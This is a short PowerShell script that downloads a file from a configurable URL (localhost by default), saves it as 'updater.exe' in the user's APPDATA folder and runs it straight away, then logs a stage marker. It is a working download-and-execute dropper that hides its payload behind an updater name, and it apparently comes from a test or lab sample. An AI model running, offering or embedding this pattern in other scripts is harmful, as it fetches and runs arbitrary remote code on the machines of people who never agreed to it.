[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://localhost:8080/assets/update.dat",
    [string]$WorkingPath = "$env:APPDATA\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $WorkingPath)
Start-Process -FilePath $WorkingPath
Write-Verbose "stage marker 43 reached"
